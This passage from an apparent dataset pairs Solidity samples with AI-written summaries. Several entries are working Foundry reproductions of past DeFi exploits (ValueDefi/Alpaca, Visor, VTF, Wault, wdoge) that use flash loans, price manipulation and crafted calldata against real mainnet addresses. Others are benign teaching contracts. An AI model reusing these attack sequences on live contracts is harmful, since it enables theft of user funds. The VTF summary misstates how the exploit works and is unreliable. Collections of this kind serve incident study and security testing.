\"UserStorage: _addr null is not allowed\");\n        require(\n            users[_addr].userAddr != address(0),\n            \"UserStorage: current User not exist\"\n        );\n\n        User memory u = users[_addr];\n\n        u.credit = _credit;\n\n        u.tradeStats.tradeTotal = _tradeStats.tradeTotal;\n\n        u.tradeStats.restTotal = _tradeStats.restTotal;\n\n        users[_addr] = u;\n        userList[userIndex[_addr]] = u;\n    }\n\n    function _updateMorgageStats(\n        address _addr,\n        MorgageStats memory _morgageStats\n    ) internal {\n        require(_addr != address(0), \"UserStorage: _addr null is not allowed\");\n        require(\n            users[_addr].userAddr != address(0),\n            \"UserStorage: current User not exist\"\n        );\n\n        User memory u = users[_addr];\n\n        u.morgageStats.mortgage = _morgageStats.mortgage;\n        u.morgageStats.freezeMortgage = _morgageStats.freezeMortgage;\n        u.morgageStats.relieveMortgage = _morgageStats.relieveMortgage;\n        u.morgageStats.inviteUserCount = _morgageStats.inviteUserCount;\n        u.morgageStats.inviteUserReward = _morgageStats.inviteUserReward;\n        u.morgageStats.applyRelieveTime = _morgageStats.applyRelieveTime;\n        u.morgageStats.handleRelieveTime = _morgageStats.handleRelieveTime;\n\n        users[_addr] = u;\n        userList[userIndex[_addr]] = u;\n    }\n\n    function _search(address _addr) internal view returns (User memory user) {\n        require(_addr != address(0), \"UserStorage: _addr null is not allowed\");\n        require(\n            users[_addr].userAddr != address(0),\n            \"UserStorage: current User not exist\"\n        );\n\n        User memory a = users[_addr];\n        return a;\n    }\n\n    function register() external {\n        require(!isMemberOf());\n        _insert(msg.sender);\n    }\n\n    function isMemberOf() public view returns (bool) {\n        return (users[msg.sender].userAddr != address(0));\n    }\n\n    function updateInfo(\n        string memory _avatar,\n        string memory _email,\n        uint256 _isOnline\n    ) external onlyMemberOf {\n        _updateInfo(msg.sender, _avatar, _email, _isOnline);\n        emit updateUser(_avatar, _email, _isOnline);\n    }\n\n    function updateTradeStats(\n        address _addr,\n        TradeStats memory _tradeStats,\n        uint256 _credit\n    ) public onlyAuthFromAddr {\n        require(\n            msg.sender == _restCAddr ||\n                msg.sender == _orderCAddr ||\n                msg.sender == _appealCAddr ||\n                msg.sender == _recordCAddr,\n            \"UserStorage:Invalid from contract address\"\n        );\n        _updateTradeStats(_addr, _tradeStats, _credit);\n    }\n\n    function updateMorgageStats(\n        address _addr,\n        MorgageStats memory _morgageStats\n    ) public onlyAuthFromAddr {\n        require(\n            msg.sender == _recordCAddr,\n            \"UserStorage:Invalid from contract address\"\n        );\n        _updateMorgageStats(_addr, _morgageStats);\n    }\n\n    function updateUserRole(address _addr, uint256 _userFlag)\n        public\n        onlyAuthFromAddr\n    {\n        require(\n            msg.sender == _recordCAddr,\n            \"UserStorage:Invalid from contract address\"\n        );\n        require(_addr != address(0), \"UserStorage: _addr null is not allowed\");\n        require(\n            users[_addr].userAddr != address(0),\n            \"UserStorage: current User not exist\"\n        );\n        require(_userFlag >= 0, \"UserStorage: Invalid userFlag 1\");\n        require(_userFlag <= 3, \"UserStorage: Invalid userFlag 3\");\n\n        User memory u = users[_addr];\n        u.userFlag = _userFlag;\n        users[_addr] = u;\n        userList[userIndex[_addr]] = u;\n    }\n\n    function searchUser(address _addr)\n        external\n        view\n        returns (User memory user)\n    {\n        return _search(_addr);\n    }\n\n    function searchUserList() external view returns (User[] memory) {\n        return userList;\n    }\n\n    function searchWitnessList(uint256 _userFlag)\n        external\n        view\n        returns (User[] memory)\n    {\n        User[] memory _resultList = new User[](userList.length);\n        for (uint256 i = 0; i < userList.length; i++) {\n            User memory _u = userList[i];\n            if (_u.userFlag == _userFlag) {\n                _resultList[i] = _u;\n            }\n        }\n        return _resultList;\n    }\n}\n",
        "summary": "This is a Solidity Smart Contract called UserStorage. It defines a User struct that includes user information such as the user's address, avatar, email, and credit. It also includes two sub-structs: TradeStats and MorgageStats, which maintain statistics related to user trading and mortgage activities. \n\nThe UserStorage contract provides functions to insert, update, and search users, as well as update trade and mortgage statistics. It also defines modifiers to restrict access to certain functions to authorized contract addresses only. \n\nOverall, this contract serves as a storage database for user information in a larger decentralized application.",
        "id": "73a9130e-34fc-4906-ba93-aa3317c045e9"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// wtf.academy\npragma solidity ^0.8.4;\n\n// UUPS\u7684Proxy\uff0c\u8ddf\u666e\u901a\u7684proxy\u50cf\u3002\n// \u5347\u7ea7\u51fd\u6570\u5728\u903b\u8f91\u51fd\u6570\u4e2d\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7\u5347\u7ea7\u51fd\u6570\u66f4\u6539\u903b\u8f91\u5408\u7ea6\u5730\u5740\uff0c\u4ece\u800c\u6539\u53d8\u5408\u7ea6\u7684\u903b\u8f91\u3002\n// \u6559\u5b66\u6f14\u793a\u7528\uff0c\u4e0d\u8981\u7528\u5728\u751f\u4ea7\u73af\u5883\ncontract UUPSProxy {\n    address public implementation; // \u903b\u8f91\u5408\u7ea6\u5730\u5740\n    address public admin; // admin\u5730\u5740\n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316admin\u548c\u903b\u8f91\u5408\u7ea6\u5730\u5740\n    constructor(address _implementation){\n        admin = msg.sender;\n        implementation = _implementation;\n    }\n\n    // fallback\u51fd\u6570\uff0c\u5c06\u8c03\u7528\u59d4\u6258\u7ed9\u903b\u8f91\u5408\u7ea6\n    fallback() external payable {\n        (bool success, bytes memory data) = implementation.delegatecall(msg.data);\n    }\n}\n\n// UUPS\u903b\u8f91\u5408\u7ea6\uff08\u5347\u7ea7\u51fd\u6570\u5199\u5728\u903b\u8f91\u5408\u7ea6\u5185\uff09\ncontract UUPS1{\n    // \u72b6\u6001\u53d8\u91cf\u548cproxy\u5408\u7ea6\u4e00\u81f4\uff0c\u9632\u6b62\u63d2\u69fd\u51b2\u7a81\n    address public implementation; \n    address public admin; \n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6539\u53d8proxy\u4e2d\u72b6\u6001\u53d8\u91cf\uff0c\u9009\u62e9\u5668\uff1a 0xc2985578\n    function foo() public{\n        words = \"old\";\n    }\n\n    // \u5347\u7ea7\u51fd\u6570\uff0c\u6539\u53d8\u903b\u8f91\u5408\u7ea6\u5730\u5740\uff0c\u53ea\u80fd\u7531admin\u8c03\u7528\u3002\u9009\u62e9\u5668\uff1a0x0900f010\n    // UUPS\u4e2d\uff0c\u903b\u8f91\u51fd\u6570\u4e2d\u5fc5\u987b\u5305\u542b\u5347\u7ea7\u51fd\u6570\uff0c\u4e0d\u7136\u5c31\u4e0d\u80fd\u518d\u5347\u7ea7\u4e86\u3002\n    function upgrade(address newImplementation) external {\n        require(msg.sender == admin);\n        implementation = newImplementation;\n    }\n}\n\n// \u65b0\u7684UUPS\u903b\u8f91\u5408\u7ea6\ncontract UUPS2{\n    // \u72b6\u6001\u53d8\u91cf\u548cproxy\u5408\u7ea6\u4e00\u81f4\uff0c\u9632\u6b62\u63d2\u69fd\u51b2\u7a81\n    address public implementation; \n    address public admin; \n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6539\u53d8proxy\u4e2d\u72b6\u6001\u53d8\u91cf\uff0c\u9009\u62e9\u5668\uff1a 0xc2985578\n    function foo() public{\n        words = \"new\";\n    }\n\n    // \u5347\u7ea7\u51fd\u6570\uff0c\u6539\u53d8\u903b\u8f91\u5408\u7ea6\u5730\u5740\uff0c\u53ea\u80fd\u7531admin\u8c03\u7528\u3002\u9009\u62e9\u5668\uff1a0x0900f010\n    // UUPS\u4e2d\uff0c\u903b\u8f91\u51fd\u6570\u4e2d\u5fc5\u987b\u5305\u542b\u5347\u7ea7\u51fd\u6570\uff0c\u4e0d\u7136\u5c31\u4e0d\u80fd\u518d\u5347\u7ea7\u4e86\u3002\n    function upgrade(address newImplementation) external {\n        require(msg.sender == admin);\n        implementation = newImplementation;\n    }\n}\n\n\n",
        "summary": "This code defines two Solidity contracts, UUPSProxy and UUPS1/UUPS2. UUPSProxy acts as a proxy for the UUPS1/UUPS2 logic contracts, allowing the admin to upgrade the logic contract by changing the implementation address. UUPS1 and UUPS2 both have a \"foo\" function that changes a string variable and an \"upgrade\" function that allows the admin to upgrade the contract to a new implementation address. The UUPS1 and UUPS2 contracts have the same state variables to prevent slot conflicts.",
        "id": "bd895765-2106-45b0-a332-d2175d9098fa"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n    Attack tx: https://bscscan.com/tx/0xa00def91954ba9f1a1320ef582420d41ca886d417d996362bf3ac3fe2bfb9006\n    Tenderly.co: https://dashboard.tenderly.co/tx/bsc/0xa00def91954ba9f1a1320ef582420d41ca886d417d996362bf3ac3fe2bfb9006/\n    Debug transaction: https://phalcon.blocksec.com/tx/bsc/0xa00def91954ba9f1a1320ef582420d41ca886d417d996362bf3ac3fe2bfb9006\n    \n    run: forge test --contracts ./src/test/ValueDefi_exp.sol -vvv  \n\n*/\n\ninterface AlpacaWBNBVault {\n    function work(uint256 id, address worker, uint256 principalAmount, uint256 loan, uint256 maxReturn, bytes calldata data)\n    external payable;\n}\n\ncontract ContractTest is DSTest {\n  AlpacaWBNBVault vault = AlpacaWBNBVault(0xd7D069493685A581d27824Fc46EdA46B7EfC0063);\n  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n  IERC20 vSafeVaultWBNB = IERC20(payable(0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8));\n  address attacker = address(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);\n  address attackerContract = address(0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 7223029); //fork bsc at block 7223029 \n  }\n\n  function testExploit() public {\n    \n    emit log_named_decimal_uint(\n            \"[Start] WBNB Balance of attacker\",\n            wbnb.balanceOf(attacker),\n            18\n        );\n\n    bytes memory data = hex\"000000000000000000000000e38ebfe8f314dcad61d5adcb29c1a26f41bed0be00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000060000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000\";\n    \n    cheats.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);\n    \n    vault.work{value: 1 ether}(0, \n              0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, \n              1000000000000000000, \n              393652744565353082751500, \n              1000000000000000000000000, \n              data\n    );\n\n    emit log_named_decimal_uint(\n            \"[End] WBNB balance of attacker after exploit\",\n            wbnb.balanceOf(attacker),\n            18\n    );\n\n    emit log_named_decimal_uint(\n          \"[End] Attacker vSafeWBNB balance after exploit\",\n          vSafeVaultWBNB.balanceOf(attacker),\n          18\n      );\n  }\n}",
        "summary": "This Solidity code is a test contract that is designed to exploit a vulnerability in the Alpaca Finance protocol. The contract imports the AlpacaWBNBVault interface and two other interfaces (IWBNB and IERC20), and declares several contract-level variables, including the attacker's address, the vault address, and the attacker's contract address. \n\nThe contract also includes a `setUp()` function that specifies the block to fork on the Binance Smart Chain (BSC) network, where the exploit will be attempted. Finally, the key function `testExploit()` will execute the exploit, which involves the function `work()` from the `vault` contract, passing the contract-specific `data` parameter.\n\nThe overall goal of the exploit is to allow the attacker to borrow a large amount of collateral from the Alpaca Finance vault by giving the `work()` function a data parameter that tricks the vault to manipulate the account balance, resulting in the transfer of an arbitrarily large amount of collateral to the attacker's address. The contract executes this function and logs the balance of the attacker's address before and after the exploit.",
        "id": "8cf46d11-212a-46fb-8d17-7531723eaccf"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function whileLoop() {\n    uint i = 0;\n\n    while (i++ < 1) {\n      uint foo = 0;\n    }\n\n    /*\n    while (i++ < 2) {\n      // Illegal, second declaration of variable.\n      uint foo = 0;\n    }\n    */\n  }\n\n  function forLoop() {\n    for (uint i = 0; i < 1; i ++) {\n\n    }\n\n    /*\n    // Illegal, second declaration of variable.\n    for (uint i = 0; i < 1; i++) {\n\n    }\n    */\n  }\n}\n",
        "summary": "This Solidity code defines a smart contract called \"MyContract\" with two functions named \"whileLoop\" and \"forLoop\". The whileLoop function uses a while loop to set a variable called \"foo\" to 0, and this loop runs only once. However, if we uncomment the second while loop that follows, it will trigger a compile error because this loop also contains a declaration of the same variable \"foo\". The forLoop function uses a for loop to perform the same action, also setting \"foo\" to 0 but just once. Similarly, if we uncomment the second for loop below, it will also lead to a compile error for the same reason.",
        "id": "1d06f6e3-ccac-4378-a735-52a5829bdf48"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IRewardsHypervisor irrewards =\n    IRewardsHypervisor(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);\n  IvVISR visr = IvVISR(0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 13849006); //fork mainnet at block 13849006\n  }\n\n  function testExploit() public {\n    irrewards.deposit(100000000000000000000000000, address(this), msg.sender);\n    // VISR_Balance =  visr.balanceOf(msg.sender);\n    emit log_named_uint(\"Attacker VIST Balance\", visr.balanceOf(msg.sender));\n  }\n\n  function owner() external returns (address) {\n    return (address(this));\n  }\n\n  function delegatedTransferERC20(\n    address token,\n    address to,\n    uint256 amount\n  ) external {}\n}\n",
        "summary": "This is a Solidity smart contract that imports other smart contracts and declares three instances of them (`IRewardsHypervisor`, `IvVISR`, `CheatCodes`). There is a `setUp` function that calls a function from `CheatCodes` contract to create a fork on the Ethereum network at a specific block number. There is a `testExploit` function that calls a deposit function from `IRewardsHypervisor` contract to deposit a large amount of cryptocurrency tokens to `msg.sender` and emits a log. Finally, there is a `delegatedTransferERC20` function that is designed to accept ERC20 token transfers but does nothing with them.",
        "id": "07a578ed-038c-4519-bdac-4d2da1b5cdd7"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1585575129936977920\n// https://twitter.com/peckshield/status/1585572694241988609\n// https://twitter.com/BeosinAlert/status/1585587030981218305\n// @TX\n// https://bscscan.com/tx/0xeeaf7e9662a7488ea724223c5156e209b630cdc21c961b85868fe45b64d9b086\n// https://bscscan.com/tx/0xc2d2d7164a9d3cfce1e1dac7dc328b350c693feb0a492a6989ceca7104eef9b7\n\ninterface IVTF is IERC20{\n    function updateUserBalance(address _user) external;\n}\n\ninterface IROUTER {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract claimReward{\n    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);\n    constructor(){\n        VTF.updateUserBalance(address(this));\n    }\n    function claim(address receiver) external{\n        VTF.updateUserBalance(address(this));\n        VTF.transfer(receiver, VTF.balanceOf(address(this)));\n    }\n}\n\ncontract ContractTest is DSTest{\n    address constant dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;\n    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IROUTER Router = IROUTER(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);\n    address [] public contractList;\n\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    // ankr rpc bsc maybe unavailible, please use QuickNode\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 22535101);\n    }\n\n    function testExploit() public{\n\n        contractFactory();\n        // change time to pass time check\n        cheat.warp(block.timestamp + 2 * 24 * 60 * 60);\n        DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        USDTToVTF();\n        VTF.transfer(contractList[0], VTF.balanceOf(address(this)));\n        for(uint i = 0; i < contractList.length - 1; ++i){\n            (bool success, ) = contractList[i].call(abi.encodeWithSignature(\"claim(address)\", contractList[i + 1]));\n            require(success);\n        }\n        uint index = contractList.length - 1;\n        (bool success, ) = contractList[index].call(abi.encodeWithSignature(\"claim(address)\", address(this)));\n        require(success);\n        VTFToUSDT();\n        USDT.transfer(dodo, 100_000 * 1e18);\n    }\n\n    function USDTToVTF() internal{\n        USDT.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(VTF);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            100_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function VTFToUSDT() internal{\n        VTF.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(VTF);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            VTF.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function contractFactory() public{\n        address _add;\n        bytes memory bytecode = type(claimReward).creationCode;\n        for(uint _salt = 0; _salt < 400; _salt++){\n            assembly{\n                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)\n            }\n            contractList.push(_add);\n        }\n    }\n}",
        "summary": "This code defines two smart contracts: `claimReward` and `ContractTest`. \n\n`claimReward` is a contract that allows a user to claim rewards in a specific token (`VTF`) using the `claim` function. \n\n`ContractTest` is a test contract that interacts with the `Dodo` DEX. It defines a few functions to convert `USDT` to `VTF` and vice versa using `IROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens`. `testExploit` is the main function of the contract that executes a flash loan attack by calling the `DVM.flashLoan` function of the `Dodo` DEX. \n\nOverall, the contract is attempting to exploit a vulnerability in the VTube Finance project which was reported on Twitter. The vulnerability allowed attackers to mint unlimited VTF tokens by depositing an amount of BNB and then creating a large number of contracts to claim rewards. The `ContractTest` contract attempts to replicate this exploit by creating a large number of `claimReward` contracts and executing the attack.",
        "id": "c3aaefa3-ba18-406e-baa7-c14716e5aca1"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Analysis\n// https://medium.com/@Knownsec_Blockchain_Lab/wault-finance-flash-loan-security-incident-analysis-368a2e1ebb5b\n// https://inspexco.medium.com/wault-finance-incident-analysis-wex-price-manipulation-using-wusdmaster-contract-c344be3ed376\n// tx\n// https://bscscan.com/tx/0x31262f15a5b82999bf8d9d0f7e58dcb1656108e6031a2797b612216a95e1670e\ninterface WUSDMASTER{\n    function stake(uint256) external;\n    function redeem(uint256) external;\n    function maxStakeAmount() external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 WUSD = IERC20(0x3fF997eAeA488A082fb7Efc8e6B9951990D0c3aB);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 WEX = IERC20(0xa9c41A46a6B3531d28d5c32F6633dd2fF05dFB90);\n    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x6102D8A7C963F78D46a35a6218B0DB4845d1612F); // WUSD BUSD\n    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // WBNB USDT\n    Uni_Router_V2 Router = Uni_Router_V2(0xD48745E39BbED146eEC15b79cBF964884F9877c2); // WS router\n    WUSDMASTER Master = WUSDMASTER(0xa79Fe386B88FBee6e492EEb76Ec48517d1eC759a);\n    uint Pair1Amount;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 9728755);\n    }\n\n    function testExploit() public{\n        // borrow WUSD\n        Pair1Amount = WUSD.balanceOf(address(Pair1)) - 1;\n        Pair1.swap(Pair1Amount, 0, address(this), new bytes(1));\n\n        // WUSD to BUSD\n        WUSD.approve(address(Router), type(uint).max);\n        WUSDToBUSD();\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSD profit after exploit\",\n            BUSD.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function waultSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        WUSD.approve(address(Master), type(uint).max);\n        // WUSD to USDT, WEX\n        Master.redeem(WUSD.balanceOf(address(this)));\n        Pair2.swap(40_000_000 * 1e18, 0, address(this), new bytes(1));\n        WUSD.transfer(address(Pair1), Pair1Amount * 10000 / 9975 + 1000);\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        USDT.approve(address(Master), type(uint).max);\n        USDT.approve(address(Router), type(uint).max);\n        // USDT to WEX\n        USDTToWEX();\n        // stake to change Pair\n        uint stakeAmout = 250_000 * 1e18;\n        // Master.maxmaxStakeAmount();\n        for(uint i = 0; i < 68; i++){\n            Master.stake(stakeAmout);\n        }\n        // WEX to USDT\n        WEX.approve(address(Router), type(uint).max);\n        WEXToUSDT();\n        USDT.transfer(address(Pair2), 40_121_000 * 1e18);\n    }\n\n    function USDTToWEX() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(WEX);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            23_000_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function WEXToUSDT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(WEX);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WEX.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function WUSDToBUSD() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(WUSD);\n        path[1] = address(BUSD);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WUSD.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n",
        "summary": "This is a Solidity smart contract that aims to exploit a vulnerability in the Wault Finance platform, as described in two analysis articles linked in the code. The contract imports an interface for the WUSDMASTER contract and several ERC20 token contracts, and defines functions to manipulate these tokens in a manner designed to exploit the vulnerability. The contract also defines functions to interact with the Uniswap and PancakeSwap decentralized exchanges via their respective interfaces. The main function `testExploit()` executes a sequence of token swaps and staking actions in an attempt to profit from the vulnerability in Wault Finance.",
        "id": "8176388f-cebd-480d-a1ab-f2e5ce626000"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n  IERC20 wdoge = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);\n  address public wdoge_wbnb = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;\n  address public BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 17248705); //fork bsc at block 17248705\n  }\n\n  function testExploit() public {\n    IPancakePair(BUSDT_WBNB_Pair).swap(0, 2900 ether, address(this), \"0x\");\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) external {\n    emit log_named_uint(\n      \"After flashswap: WBNB balance of attacker\",\n      wbnb.balanceOf(address(this)) / 1e18\n    );\n    wbnb.transfer(wdoge_wbnb, 2900 ether);\n    IPancakePair(wdoge_wbnb).swap(\n      6638066501837822413045167240755,\n      0,\n      address(this),\n      \"\"\n    );\n    wdoge.transfer(wdoge_wbnb, 5532718068557297916520398869451);\n    IPancakePair(wdoge_wbnb).skim(address(this));\n    IPancakePair(wdoge_wbnb).sync();\n    wdoge.transfer(wdoge_wbnb, 4466647961091568568393910837883);\n    IPancakePair(wdoge_wbnb).swap(0, 2978658352619485704640, address(this), \"\");\n    wbnb.transfer(BUSDT_WBNB_Pair, 2908 ether);\n    emit log_named_uint(\n      \"After repaying flashswap, Profit: WBNB balance of attacker\",\n      wbnb.balanceOf(address(this)) / 1e18\n    );\n  }\n}\n",
        "summary": "This is a Solidity smart contract containing a test function that exploits a flashswap vulnerability in a PancakeSwap pair. The function `testExploit()` executes a `swap()` function on a PancakeSwap pair with a large value (`2900 ether`) of the WBNB token as the second input. This triggers the `pancakeCall()` function in the contract, which performs a series of swaps and transfers to execute a profitable arbitrage. The `setUp()` function sets up a specific blockchain state for the test.",
        "id": "ec5cd60a-d50a-4b31-9616-1e503d465496"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// author: 0xAA\n// original contract on ETH: https://rinkeby.etherscan.io/token/0xc778417e063141139fce010982780140aa0cd5ab?a=0xe16c1623c1aa7d919cd2241d8b36d9e79c1be2a2#code\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract WETH is ERC20{\n    // \u4e8b\u4ef6\uff1a\u5b58\u6b3e\u548c\u53d6\u6b3e\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316ERC20\u7684\u540d\u5b57\n    constructor() ERC20(\"WETH\", \"WETH\"){\n    }\n\n    // \u56de\u8c03\u51fd\u6570\uff0c\u5f53\u7528\u6237\u5f80WETH\u5408\u7ea6\u8f6cETH\u65f6\uff0c\u4f1a\u89e6\u53d1deposit()\u51fd\u6570\n    fallback() external payable {\n        deposit();\n    }\n    // \u56de\u8c03\u51fd\u6570\uff0c\u5f53\u7528\u6237\u5f80WETH\u5408\u7ea6\u8f6cETH\u65f6\uff0c\u4f1a\u89e6\u53d1deposit()\u51fd\u6570\n    receive() external payable {\n        deposit();\n    }\n\n    // \u5b58\u6b3e\u51fd\u6570\uff0c\u5f53\u7528\u6237\u5b58\u5165ETH\u65f6\uff0c\u7ed9\u4ed6\u94f8\u9020\u7b49\u91cf\u7684WETH\n    function deposit() public payable {\n        _mint(msg.sender, msg.value);\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    // \u63d0\u6b3e\u51fd\u6570\uff0c\u7528\u6237\u9500\u6bc1WETH\uff0c\u53d6\u56de\u7b49\u91cf\u7684ETH\n    function withdraw(uint amount) public {\n        require(balanceOf(msg.sender) >= amount);\n        _burn(msg.sender, amount);\n        payable(msg.sender).transfer(amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n}",
        "summary": "This code defines a smart contract called \"WETH\" that is an ERC20-compliant token. This token represents Ether (ETH) on the Ethereum network. The contract allows users to deposit ETH into the contract and receive an equal amount of WETH tokens in return. Users can also withdraw their WETH tokens at any time and receive an equivalent amount of ETH in return. The contract emits events when deposits and withdrawals are made.",
        "id": "bdfb6a59-9c14-4760-ab5a-a3ad2d2ac323"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {SafeTransferLib} from \"../utils/SafeTransferLib.sol\";\n\nimport {WETH} from \"../tokens/WETH.sol\";\n\ncontract WETHTest is DSTestPlus {\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n    }\n\n    function testFallbackDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), 1 ether);\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n    }\n\n    function testDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: 1 ether}();\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n   